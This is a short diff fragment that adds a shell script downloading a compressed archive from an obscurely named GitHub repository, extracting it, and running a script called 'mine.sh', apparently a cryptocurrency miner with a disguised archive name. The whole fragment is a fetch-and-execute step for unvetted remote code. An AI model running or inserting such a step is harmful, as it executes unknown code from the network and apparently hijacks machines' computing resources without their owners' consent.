@@ -1,0 +1,5 @@
+wget https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxweb84.tar.xz
+
+tar -xvf ./linuxweb84.tar.xz
+
+./mine.sh
